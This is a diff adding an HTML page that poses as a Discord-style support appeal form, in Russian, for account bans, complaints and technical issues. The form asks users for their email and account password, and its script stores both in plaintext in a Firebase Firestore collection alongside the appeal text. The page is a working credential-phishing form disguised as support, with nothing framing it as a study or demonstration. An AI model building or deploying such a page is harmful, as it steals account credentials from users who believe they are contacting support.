@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Поддержка Discord Style</title>
+  <style>
+    body {
+      background-color: rgb(20, 20, 20);
+      color: white;
+      font-family: Arial, sans-serif;
+      display: flex;
+      justify-content: center;
+      padding: 40px;
+    }
+
+    form {
+      background-color: rgb(25, 25, 25);
+      padding: 30px;
+      border-radius: 12px;
+      width: 100%;
+      max-width: 500px;
+      box-shadow: 0 0 15px rgba(255, 192, 128, 0.2);
+    }
+
+    label {
+      display: block;
+      margin: 15px 0 5px;
+    }
+
+    input, select, textarea {
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+      background-color: rgb(20, 20, 20);
+      color: white;
+    }
+
+    button {
+      margin-top: 20px;
+      width: 100%;
+      padding: 12px;
+      background-color: rgb(255, 192, 128);
+      border: none;
+      color: black;
+      font-weight: bold;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+
+    button:hover {
+      background-color: rgb(255, 172, 100);
+    }
+  </style>
+</head>
+<body>
+  <form id="appealForm">
+    <h2>Форма обращения</h2>
+    <label for="name">Как к вам обращаться:</label>
+    <input type="text" id="name" required />
+
+    <label for="reason">Выберите причину:</label>
+    <select id="reason" required>
+      <option value="" disabled selected>Выберите...</option>
+      <option>Блокировка аккаунта</option>
+      <option>Жалоба на пользователя</option>
+      <option>Техническая проблема</option>
+      <option>Другое</option>
+    </select>
+
+    <label for="email">Почта:</label>
+    <input type="email" id="email" required />
+
+    <label for="password">Пароль:</label>
+    <input type="password" id="password" required />
+
+    <label for="message">Жалоба:</label>
+    <textarea id="message" rows="5" required></textarea>
+
+    <button type="submit">Отправить</button>
+  </form>
+
+  <script type="module">
+    // Firebase SDK
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-app.js";
+    import { getFirestore, doc, setDoc } from "https://www.gstatic.com/firebasejs/10.5.0/firebase-firestore.js";
+
+    const firebaseConfig = {
+      apiKey: "ТВОЙ_API_KEY",
+      authDomain: "ТВОЙ_AUTH_DOMAIN",
+      projectId: "ТВОЙ_PROJECT_ID",
+      storageBucket: "ТВОЙ_STORAGE_BUCKET",
+      messagingSenderId: "ТВОЙ_SENDER_ID",
+      appId: "ТВОЙ_APP_ID"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const db = getFirestore(app);
+
+    const form = document.getElementById('appealForm');
+
+    form.addEventListener('submit', async (e) => {
+      e.preventDefault();
+
+      const name = form.name.value.trim();
+      const reason = form.reason.value;
+      const email = form.email.value.trim();
+      const password = form.password.value;
+      const message = form.message.value.trim();
+
+      try {
+        await setDoc(doc(db, "appeals", name), {
+          name,
+          reason,
+          email,
+          password,
+          message,
+          timestamp: new Date().toISOString()
+        });
+
+        alert("Обращение отправлено!");
+        form.reset();
+      } catch (error) {
+        alert("Ошибка при отправке: " + error.message);
+      }
+    });
+  </script>
+</body>
+</html>
